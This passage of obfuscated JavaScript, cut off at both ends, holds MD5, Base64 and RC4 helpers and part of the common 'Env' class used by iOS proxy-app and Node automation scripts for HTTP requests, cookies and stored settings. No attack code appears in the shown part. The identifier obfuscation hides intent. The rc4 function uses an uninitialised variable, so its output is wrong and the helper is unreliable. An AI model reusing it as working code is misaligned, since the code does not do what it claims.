    _0x56f8f5[_0x18be36 - 2] = _0x432f9c << 3;
    _0x56f8f5[_0x18be36 - 1] = _0x432f9c >>> 29;
    return _0x56f8f5;
  }

  function _0x29902e(_0x3b6dd1) {
    var _0xb0f050,
        _0x14a955,
        _0x303a14 = '',
        _0x220d3d = '';

    for (_0x14a955 = 0; 3 >= _0x14a955; _0x14a955++) {
      _0xb0f050 = _0x3b6dd1 >>> 8 * _0x14a955 & 255;
      _0x220d3d = '0' + _0xb0f050["toString"](16);
      _0x303a14 += _0x220d3d["substr"](_0x220d3d['length'] - 2, 2);
    }

    return _0x303a14;
  }

  function _0x45479e(_0x49c872) {
    _0x49c872 = _0x49c872['replace'](/\r\n/g, "\n");

    for (var _0x44de14 = '', _0x15c54c = 0; _0x15c54c < _0x49c872["length"]; _0x15c54c++) {
      var _0x51030d = _0x49c872["charCodeAt"](_0x15c54c);

      128 > _0x51030d ? _0x44de14 += String["fromCharCode"](_0x51030d) : _0x51030d > 127 && 2048 > _0x51030d ? (_0x44de14 += String["fromCharCode"](_0x51030d >> 6 | 192), _0x44de14 += String["fromCharCode"](63 & _0x51030d | 128)) : (_0x44de14 += String["fromCharCode"](_0x51030d >> 12 | 224), _0x44de14 += String['fromCharCode'](_0x51030d >> 6 & 63 | 128), _0x44de14 += String["fromCharCode"](63 & _0x51030d | 128));
    }

    return _0x44de14;
  }

  var _0x3b0adf,
      _0x291822,
      _0x493f5b,
      _0x3b07fd,
      _0x47ea0c,
      _0x5b2389,
      _0x2bec1d,
      _0x367358,
      _0x4cf80b,
      _0x307204 = [],
      _0x5da8df = 7,
      _0x3f4dd8 = 12,
      _0x23c8bf = 17,
      _0x2b3ba1 = 22,
      _0x53a59f = 5,
      _0x7d62d6 = 9,
      _0x26b256 = 14,
      _0x4e148a = 20,
      _0x55ca8c = 4,
      _0x49c203 = 11,
      _0x14f21c = 16,
      _0x14f261 = 23,
      _0x94f642 = 6,
      _0x1a464c = 10,
      _0x3a74fc = 15,
      _0x3fd43a = 21;

  for (_0x594b56 = _0x45479e(_0x594b56), _0x307204 = _0x2b3020(_0x594b56), _0x5b2389 = 1732584193, _0x2bec1d = 4023233417, _0x367358 = 2562383102, _0x4cf80b = 271733878, _0x3b0adf = 0; _0x3b0adf < _0x307204["length"]; _0x3b0adf += 16) {
    _0x291822 = _0x5b2389;
    _0x493f5b = _0x2bec1d;
    _0x3b07fd = _0x367358;
    _0x47ea0c = _0x4cf80b;
    _0x5b2389 = _0x55ac3e(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 0], _0x5da8df, 3614090360);
    _0x4cf80b = _0x55ac3e(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 1], _0x3f4dd8, 3905402710);
    _0x367358 = _0x55ac3e(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 2], _0x23c8bf, 606105819);
    _0x2bec1d = _0x55ac3e(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 3], _0x2b3ba1, 3250441966);
    _0x5b2389 = _0x55ac3e(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 4], _0x5da8df, 4118548399);
    _0x4cf80b = _0x55ac3e(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 5], _0x3f4dd8, 1200080426);
    _0x367358 = _0x55ac3e(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 6], _0x23c8bf, 2821735955);
    _0x2bec1d = _0x55ac3e(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 7], _0x2b3ba1, 4249261313);
    _0x5b2389 = _0x55ac3e(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 8], _0x5da8df, 1770035416);
    _0x4cf80b = _0x55ac3e(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 9], _0x3f4dd8, 2336552879);
    _0x367358 = _0x55ac3e(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 10], _0x23c8bf, 4294925233);
    _0x2bec1d = _0x55ac3e(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 11], _0x2b3ba1, 2304563134);
    _0x5b2389 = _0x55ac3e(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 12], _0x5da8df, 1804603682);
    _0x4cf80b = _0x55ac3e(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 13], _0x3f4dd8, 4254626195);
    _0x367358 = _0x55ac3e(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 14], _0x23c8bf, 2792965006);
    _0x2bec1d = _0x55ac3e(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 15], _0x2b3ba1, 1236535329);
    _0x5b2389 = _0x2af6cc(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 1], _0x53a59f, 4129170786);
    _0x4cf80b = _0x2af6cc(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 6], _0x7d62d6, 3225465664);
    _0x367358 = _0x2af6cc(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 11], _0x26b256, 643717713);
    _0x2bec1d = _0x2af6cc(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 0], _0x4e148a, 3921069994);
    _0x5b2389 = _0x2af6cc(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 5], _0x53a59f, 3593408605);
    _0x4cf80b = _0x2af6cc(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 10], _0x7d62d6, 38016083);
    _0x367358 = _0x2af6cc(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 15], _0x26b256, 3634488961);
    _0x2bec1d = _0x2af6cc(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 4], _0x4e148a, 3889429448);
    _0x5b2389 = _0x2af6cc(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 9], _0x53a59f, 568446438);
    _0x4cf80b = _0x2af6cc(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 14], _0x7d62d6, 3275163606);
    _0x367358 = _0x2af6cc(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 3], _0x26b256, 4107603335);
    _0x2bec1d = _0x2af6cc(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 8], _0x4e148a, 1163531501);
    _0x5b2389 = _0x2af6cc(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 13], _0x53a59f, 2850285829);
    _0x4cf80b = _0x2af6cc(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 2], _0x7d62d6, 4243563512);
    _0x367358 = _0x2af6cc(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 7], _0x26b256, 1735328473);
    _0x2bec1d = _0x2af6cc(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 12], _0x4e148a, 2368359562);
    _0x5b2389 = _0x1a6a93(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 5], _0x55ca8c, 4294588738);
    _0x4cf80b = _0x1a6a93(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 8], _0x49c203, 2272392833);
    _0x367358 = _0x1a6a93(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 11], _0x14f21c, 1839030562);
    _0x2bec1d = _0x1a6a93(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 14], _0x14f261, 4259657740);
    _0x5b2389 = _0x1a6a93(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 1], _0x55ca8c, 2763975236);
    _0x4cf80b = _0x1a6a93(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 4], _0x49c203, 1272893353);
    _0x367358 = _0x1a6a93(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 7], _0x14f21c, 4139469664);
    _0x2bec1d = _0x1a6a93(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 10], _0x14f261, 3200236656);
    _0x5b2389 = _0x1a6a93(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 13], _0x55ca8c, 681279174);
    _0x4cf80b = _0x1a6a93(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 0], _0x49c203, 3936430074);
    _0x367358 = _0x1a6a93(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 3], _0x14f21c, 3572445317);
    _0x2bec1d = _0x1a6a93(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 6], _0x14f261, 76029189);
    _0x5b2389 = _0x1a6a93(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 9], _0x55ca8c, 3654602809);
    _0x4cf80b = _0x1a6a93(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 12], _0x49c203, 3873151461);
    _0x367358 = _0x1a6a93(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 15], _0x14f21c, 530742520);
    _0x2bec1d = _0x1a6a93(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 2], _0x14f261, 3299628645);
    _0x5b2389 = _0x16e90f(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 0], _0x94f642, 4096336452);
    _0x4cf80b = _0x16e90f(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 7], _0x1a464c, 1126891415);
    _0x367358 = _0x16e90f(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 14], _0x3a74fc, 2878612391);
    _0x2bec1d = _0x16e90f(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 5], _0x3fd43a, 4237533241);
    _0x5b2389 = _0x16e90f(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 12], _0x94f642, 1700485571);
    _0x4cf80b = _0x16e90f(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 3], _0x1a464c, 2399980690);
    _0x367358 = _0x16e90f(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 10], _0x3a74fc, 4293915773);
    _0x2bec1d = _0x16e90f(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 1], _0x3fd43a, 2240044497);
    _0x5b2389 = _0x16e90f(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 8], _0x94f642, 1873313359);
    _0x4cf80b = _0x16e90f(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 15], _0x1a464c, 4264355552);
    _0x367358 = _0x16e90f(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 6], _0x3a74fc, 2734768916);
    _0x2bec1d = _0x16e90f(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 13], _0x3fd43a, 1309151649);
    _0x5b2389 = _0x16e90f(_0x5b2389, _0x2bec1d, _0x367358, _0x4cf80b, _0x307204[_0x3b0adf + 4], _0x94f642, 4149444226);
    _0x4cf80b = _0x16e90f(_0x4cf80b, _0x5b2389, _0x2bec1d, _0x367358, _0x307204[_0x3b0adf + 11], _0x1a464c, 3174756917);
    _0x367358 = _0x16e90f(_0x367358, _0x4cf80b, _0x5b2389, _0x2bec1d, _0x307204[_0x3b0adf + 2], _0x3a74fc, 718787259);
    _0x2bec1d = _0x16e90f(_0x2bec1d, _0x367358, _0x4cf80b, _0x5b2389, _0x307204[_0x3b0adf + 9], _0x3fd43a, 3951481745);
    _0x5b2389 = _0x1dce9d(_0x5b2389, _0x291822);
    _0x2bec1d = _0x1dce9d(_0x2bec1d, _0x493f5b);
    _0x367358 = _0x1dce9d(_0x367358, _0x3b07fd);
    _0x4cf80b = _0x1dce9d(_0x4cf80b, _0x47ea0c);
  }

  var _0x1c3fe9 = _0x29902e(_0x5b2389) + _0x29902e(_0x2bec1d) + _0x29902e(_0x367358) + _0x29902e(_0x4cf80b);

  return _0x1c3fe9["toLowerCase"]();
}

function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

  this["encode"] = function (_0x8c59af) {
    var _0x32857b = '',
        _0x508920,
        _0x5e836e,
        _0x37432c,
        _0x4654a6,
        _0x645d56,
        _0x112420,
        _0x56e635,
        _0x5ca66e = 0;

    _0x8c59af = _utf8_encode(_0x8c59af);

    while (_0x5ca66e < _0x8c59af["length"]) {
      _0x508920 = _0x8c59af['charCodeAt'](_0x5ca66e++);
      _0x5e836e = _0x8c59af['charCodeAt'](_0x5ca66e++);
      _0x37432c = _0x8c59af["charCodeAt"](_0x5ca66e++);
      _0x4654a6 = _0x508920 >> 2;
      _0x645d56 = (_0x508920 & 3) << 4 | _0x5e836e >> 4;
      _0x112420 = (_0x5e836e & 15) << 2 | _0x37432c >> 6;
      _0x56e635 = _0x37432c & 63;

      if (isNaN(_0x5e836e)) {
        _0x112420 = _0x56e635 = 64;
      } else {
        isNaN(_0x37432c) && (_0x56e635 = 64);
      }

      _0x32857b = _0x32857b + _keyStr['charAt'](_0x4654a6) + _keyStr['charAt'](_0x645d56) + _keyStr["charAt"](_0x112420) + _keyStr["charAt"](_0x56e635);
    }

    return _0x32857b;
  };

  this["decode"] = function (_0x303939) {
    var _0x32a1ba = '',
        _0x4b3628,
        _0x5a3fd9,
        _0x578bc2,
        _0x309981,
        _0x5b2f90,
        _0x36b563,
        _0x1c7e56,
        _0x567fec = 0;

    _0x303939 = _0x303939['replace'](/[^A-Za-z0-9\+\/\=]/g, '');

    while (_0x567fec < _0x303939["length"]) {
      _0x309981 = _keyStr["indexOf"](_0x303939["charAt"](_0x567fec++));
      _0x5b2f90 = _keyStr['indexOf'](_0x303939['charAt'](_0x567fec++));
      _0x36b563 = _keyStr["indexOf"](_0x303939["charAt"](_0x567fec++));
      _0x1c7e56 = _keyStr["indexOf"](_0x303939['charAt'](_0x567fec++));
      _0x4b3628 = _0x309981 << 2 | _0x5b2f90 >> 4;
      _0x5a3fd9 = (_0x5b2f90 & 15) << 4 | _0x36b563 >> 2;
      _0x578bc2 = (_0x36b563 & 3) << 6 | _0x1c7e56;
      _0x32a1ba = _0x32a1ba + String["fromCharCode"](_0x4b3628);
      _0x36b563 != 64 && (_0x32a1ba = _0x32a1ba + String["fromCharCode"](_0x5a3fd9));
      _0x1c7e56 != 64 && (_0x32a1ba = _0x32a1ba + String["fromCharCode"](_0x578bc2));
    }

    _0x32a1ba = _utf8_decode(_0x32a1ba);
    return _0x32a1ba;
  };

  _utf8_encode = function (_0x28d02a) {
    _0x28d02a = _0x28d02a["replace"](/\r\n/g, "\n");
    var _0x1761d8 = '';

    for (var _0x69ad30 = 0; _0x69ad30 < _0x28d02a["length"]; _0x69ad30++) {
      var _0xb5e405 = _0x28d02a["charCodeAt"](_0x69ad30);

      if (_0xb5e405 < 128) {
        _0x1761d8 += String["fromCharCode"](_0xb5e405);
      } else {
        _0xb5e405 > 127 && _0xb5e405 < 2048 ? (_0x1761d8 += String['fromCharCode'](_0xb5e405 >> 6 | 192), _0x1761d8 += String["fromCharCode"](_0xb5e405 & 63 | 128)) : (_0x1761d8 += String["fromCharCode"](_0xb5e405 >> 12 | 224), _0x1761d8 += String["fromCharCode"](_0xb5e405 >> 6 & 63 | 128), _0x1761d8 += String["fromCharCode"](_0xb5e405 & 63 | 128));
      }
    }

    return _0x1761d8;
  };

  _utf8_decode = function (_0x1c11d6) {
    var _0x1f4076 = '',
        _0x4807d5 = 0,
        _0x241d70 = c1 = c2 = 0;

    while (_0x4807d5 < _0x1c11d6["length"]) {
      _0x241d70 = _0x1c11d6["charCodeAt"](_0x4807d5);

      if (_0x241d70 < 128) {
        _0x1f4076 += String["fromCharCode"](_0x241d70);
        _0x4807d5++;
      } else {
        _0x241d70 > 191 && _0x241d70 < 224 ? (c2 = _0x1c11d6["charCodeAt"](_0x4807d5 + 1), _0x1f4076 += String["fromCharCode"]((_0x241d70 & 31) << 6 | c2 & 63), _0x4807d5 += 2) : (c2 = _0x1c11d6["charCodeAt"](_0x4807d5 + 1), c3 = _0x1c11d6["charCodeAt"](_0x4807d5 + 2), _0x1f4076 += String["fromCharCode"]((_0x241d70 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x4807d5 += 3);
      }
    }

    return _0x1f4076;
  };
}

function rc4(_0x1d35da, _0x556802) {
  var _0x20d6a7 = Array(256),
      _0x30d9e5 = Array(_0x1d35da["length"]);

  for (var _0x5b64b9 = 0; _0x5b64b9 < 256; _0x5b64b9++) {
    _0x20d6a7[_0x5b64b9] = _0x5b64b9;

    var _0x22a685 = (_0x22a685 + _0x20d6a7[_0x5b64b9] + _0x556802["charCodeAt"](_0x5b64b9 % _0x556802["length"])) % 256,
        _0x5a85cf = _0x20d6a7[_0x5b64b9];

    _0x20d6a7[_0x5b64b9] = _0x20d6a7[_0x22a685];
    _0x20d6a7[_0x22a685] = _0x5a85cf;
  }

  for (var _0x5b64b9 = 0; _0x5b64b9 < _0x1d35da['length']; _0x5b64b9++) {
    _0x30d9e5[_0x5b64b9] = _0x1d35da['charCodeAt'](_0x5b64b9);
  }

  for (var _0x1c7419 = 0; _0x1c7419 < _0x30d9e5['length']; _0x1c7419++) {
    var _0x5b64b9 = (_0x5b64b9 + 1) % 256,
        _0x22a685 = (_0x22a685 + _0x20d6a7[_0x5b64b9]) % 256,
        _0x5a85cf = _0x20d6a7[_0x5b64b9];

    _0x20d6a7[_0x5b64b9] = _0x20d6a7[_0x22a685];
    _0x20d6a7[_0x22a685] = _0x5a85cf;

    var _0xae038 = (_0x20d6a7[_0x5b64b9] + _0x20d6a7[_0x22a685] % 256) % 256;

    _0x30d9e5[_0x1c7419] = String['fromCharCode'](_0x30d9e5[_0x1c7419] ^ _0x20d6a7[_0xae038]);
  }

  return _0x30d9e5["join"]('');
}

function Env(t, e) {
  class s {
    constructor(t) {
      this["env"] = t;
    }

    send(t, e = "GET") {
      t = "string" == typeof t ? {
        "url": t
      } : t;
      let s = this["get"];
      "POST" === e && (s = this["post"]);
      return new Promise((e, i) => {
        s["call"](this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }

    get(t) {
      return this["send"]["call"](this["env"], t);
    }

    post(t) {
      return this["send"]["call"](this["env"], t, "POST");
    }

  }

  return new class {
    constructor(t, e) {
      this["name"] = t;
      this["http"] = new s(this);
      this["data"] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this["isMute"] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["encoding"] = "utf-8";
      this["startTime"] = new Date()["getTime"]();
      Object["assign"](this, e);
      this["log"]("", `🔔${this["name"]}, 开始!`);
    }

    isNode() {
      return "undefined" != typeof module && !!module["exports"];
    }

    isQuanX() {
      return "undefined" != typeof $task;
    }

    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }

    isLoon() {
      return "undefined" != typeof $loon;
    }

    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }

    toObj(t, e = null) {
      try {
        return JSON["parse"](t);
      } catch {
        return e;
      }
    }

    toStr(t, e = null) {
      try {
        return JSON["stringify"](t);
      } catch {
        return e;
      }
    }

    getjson(t, e) {
      let s = e;
      const i = this["getdata"](t);

      if (i) {
        try {
          s = JSON["parse"](this["getdata"](t));
        } catch {}
      }

      return s;
    }

    setjson(t, e) {
      try {
        return this["setdata"](JSON["stringify"](t), e);
      } catch {
        return false;
      }
    }

    getScript(t) {
      return new Promise(e => {
        this["get"]({
          "url": t
        }, (t, s, i) => e(i));
      });
    }

    runScript(t, e) {
      return new Promise(s => {
        let i = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i["replace"](/\n/g, "")["trim"]() : i;
        let r = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e["timeout"] ? e["timeout"] : r;
        const [o, h] = i["split"]("@"),
              n = {
          "url": `http://${h}/v1/scripting/evaluate`,
          "body": {
            "script_text": t,
            "mock_type": "cron",
            "timeout": r
          },
          "headers": {
            "X-Key": o,
            "Accept": "*/*"
          }
        };
        this["post"](n, (t, e, i) => s(i));
      })["catch"](t => this["logErr"](t));
    }

    loaddata() {
      if (!this["isNode"]()) {
        return {};
      }

      {
        this["fs"] = this["fs"] ? this["fs"] : require("fs");
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              e = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              s = this["fs"]["existsSync"](t),
              i = !s && this["fs"]["existsSync"](e);

        if (!s && !i) {
          return {};
        }

        {
          const i = s ? t : e;

          try {
            return JSON["parse"](this["fs"]["readFileSync"](i));
          } catch (t) {
            return {};
          }
        }
      }
    }

    writedata() {
      if (this["isNode"]()) {
        this["fs"] = this["fs"] ? this["fs"] : require("fs");
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              e = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              s = this["fs"]["existsSync"](t),
              i = !s && this["fs"]["existsSync"](e),
              r = JSON["stringify"](this["data"]);
        s ? this["fs"]["writeFileSync"](t, r) : i ? this["fs"]["writeFileSync"](e, r) : this["fs"]["writeFileSync"](t, r);
      }
    }

    lodash_get(t, e, s) {
      const i = e["replace"](/\[(\d+)\]/g, ".$1")["split"](".");
      let r = t;

      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }

      return r;
    }

    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array["isArray"](e) || (e = e["toString"]()["match"](/[^.[\]]+/g) || []), e["slice"](0, -1)["reduce"]((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math["abs"](e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e["length"] - 1]] = s, t);
    }

    getdata(t) {
      let e = this["getval"](t);

      if (/^@/["test"](t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/["exec"](t),
              r = s ? this["getval"](s) : "";

        if (r) {
          try {
            const t = JSON["parse"](r);
            e = t ? this["lodash_get"](t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }

      return e;
    }

    setdata(t, e) {
      let s = false;

      if (/^@/["test"](e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/["exec"](e),
              o = this["getval"](i),
              h = i ? "null" === o ? null : o || "{}" : "{}";

        try {
          const e = JSON["parse"](h);
          this["lodash_set"](e, r, t);
          s = this["setval"](JSON["stringify"](e), i);
        } catch (e) {
          const o = {};
          this["lodash_set"](o, r, t);
          s = this["setval"](JSON["stringify"](o), i);
        }
      } else {
        s = this["setval"](t, e);
      }

      return s;
    }

    getval(t) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](t) : this["isQuanX"]() ? $prefs["valueForKey"](t) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][t]) : this["data"] && this["data"][t] || null;
    }

    setval(t, e) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](t, e) : this["isQuanX"]() ? $prefs["setValueForKey"](t, e) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][e] = t, this["writedata"](), true) : this["data"] && this["data"][e] || null;
    }

    initGotEnv(t) {
      this["got"] = this["got"] ? this["got"] : require("got");
      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
      this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
      t && (t["headers"] = t["headers"] ? t["headers"] : {}, void 0 === t["headers"]["Cookie"] && void 0 === t["cookieJar"] && (t["cookieJar"] = this["ckjar"]));
    }

    get(t, e = () => {}) {
      if (t["headers"] && (delete t["headers"]["Content-Type"], delete t["headers"]["Content-Length"]), this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t["headers"], {
          "X-Surge-Skip-Scripting": false
        }));
        $httpClient["get"](t, (t, s, i) => {
          !t && s && (s["body"] = i, s["statusCode"] = s["status"]);
          e(t, s, i);
        });
      } else {
        if (this["isQuanX"]()) {
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], {
            "hints": false
          }));
          $task["fetch"](t)["then"](t => {
            const {
              "statusCode": s,
              "statusCode": i,
              "headers": r,
              "body": o
            } = t;
            e(null, {
              "status": s,
              "statusCode": i,
              "headers": r,
              "body": o
            }, o);
          }, t => e(t));
        } else {
          if (this["isNode"]()) {
            let s = require("iconv-lite");

            this["initGotEnv"](t);
            this["got"](t)["on"]("redirect", (t, e) => {
              try {
                if (t["headers"]["set-cookie"]) {
                  const s = t["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]["parse"])["toString"]();
                  s && this["ckjar"]["setCookieSync"](s, null);
                  e["cookieJar"] = this["ckjar"];
                }
              } catch (t) {
                this["logErr"](t);
              }
            })["then"](t => {
              const {
                "statusCode": i,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              } = t;
              e(null, {
                "status": i,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              }, s["decode"](h, this["encoding"]));
            }, t => {
              const {
                "message": i,
                "response": r
              } = t;
              e(i, r, r && s["decode"](r["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    post(t, e = () => {}) {
      const s = t["method"] ? t["method"]["toLocaleLowerCase"]() : "post";

      if (t["body"] && t["headers"] && !t["headers"]["Content-Type"] && (t["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), t["headers"] && delete t["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t["headers"], {
          "X-Surge-Skip-Scripting": false
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s["body"] = i, s["statusCode"] = s["status"]);
          e(t, s, i);
        });
      } else {
        if (this["isQuanX"]()) {
          t["method"] = s;
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], {
            "hints": false
          }));
          $task["fetch"](t)["then"](t => {
            const {
              "statusCode": s,
              "statusCode": i,
              "headers": r,
              "body": o
            } = t;
            e(null, {
              "status": s,
              "statusCode": i,
              "headers": r,
              "body": o
            }, o);
          }, t => e(t));
        } else {
          if (this["isNode"]()) {
            let i = require("iconv-lite");

            this["initGotEnv"](t);
            const {
              "url": r,
              ...o
            } = t;
            this["got"][s](r, o)["then"](t => {
              const {
                "statusCode": s,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              } = t;
              e(null, {
                "status": s,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              }, i["decode"](h, this["encoding"]));
            }, t => {
              const {
                "message": s,
                "response": r
              } = t;
              e(s, r, r && i["decode"](r["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s["getMonth"]() + 1,
        "d+": s["getDate"](),
        "H+": s["getHours"](),
        "m+": s["getMinutes"](),
        "s+": s["getSeconds"](),
        "q+": Math["floor"]((s["getMonth"]() + 3) / 3),
        "S": s["getMilliseconds"]()
      };
      /(y+)/["test"](t) && (t = t["replace"](RegExp["$1"], (s["getFullYear"]() + "")["substr"](4 - RegExp["$1"]["length"])));

      for (let e in i) new RegExp("(" + e + ")")["test"](t) && (t = t["replace"](RegExp["$1"], 1 == RegExp["$1"]["length"] ? i[e] : ("00" + i[e])["substr"](("" + i[e])["length"])));

      return t;
    }

    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }

        if ("string" == typeof t) {
          return this["isLoon"]() ? t : this["isQuanX"]() ? {
            "open-url": t
          } : this["isSurge"]() ? {
            "url": t
          } : void 0;
        }

        if ("object" == typeof t) {
          if (this["isLoon"]()) {
            let e = t["openUrl"] || t["url"] || t["open-url"],
                s = t["mediaUrl"] || t["media-url"];
            return {
              "openUrl": e,
              "mediaUrl": s
            };
          }

          if (this["isQuanX"]()) {
            let e = t["open-url"] || t["url"] || t["openUrl"],
                s = t["media-url"] || t["mediaUrl"];
            return {
